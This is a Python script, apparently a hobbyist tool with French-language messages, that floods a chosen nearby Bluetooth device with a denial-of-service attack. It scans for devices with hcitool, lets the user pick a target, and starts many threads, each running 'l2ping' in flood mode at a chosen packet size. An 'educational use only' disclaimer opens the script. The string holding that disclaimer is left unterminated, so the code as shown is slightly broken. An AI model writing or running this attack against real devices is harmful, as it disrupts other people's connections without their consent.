import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')

def main():
    print('Bluetooth DOS attack(bravo tu va empecher un mec de se connexion en bluetooth(peu utiles)\n')
    time.sleep(0.1)
    print('\x1bThis tool is provided for educational and legal penetration testing purposes only. The developers assume no responsibility for any misuse or damage caused by the use of this program. It is the sole responsibility of the end-user to ensure that their actions comply with applicable laws and ethical standards. By using this software, you agree to use it responsibly and accept all associated risks.
)
    if input("ACCEPTEZ VOUS LES CONDITIONS ?/DO U AGREE ? (y/n) > ").lower() == 'y':
        os.system('clear')
        print('Bluetooth DOS Script\n')
        print("jte cherche ...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()[1:]
        array = [line.split()[0] for line in lines]
        print("|id   |   mac_addres  |   device_name|")
        for i, line in enumerate(lines):
            print(f"|{i}   |   {line.split()[0]}  |   {''.join(line.split()[1:])}|")
        target_id = input('Target id or mac/adresse mac > ')
        target_addr = array[int(target_id)] if target_id.isdigit() else target_id
        packages_size = int(input('Packages size > '))
        threads_count = int(input('Threads count > '))
        os.system('clear')
        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
        for i in range(3, 0, -1):
            print(f'[*] {i}')
            time.sleep(1)
        os.system('clear')
        print('[*] Building...\n')
        for _ in range(threads_count):
            threading.Thread(target=DOS, args=[target_addr, packages_size]).start()
        print('[*] Built..')
        print('[*] Starting...')
    else:
        print('trip trip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        print('\n[*] Aborted')
    except Exception as e:
        print('[!] ERROR:', e)
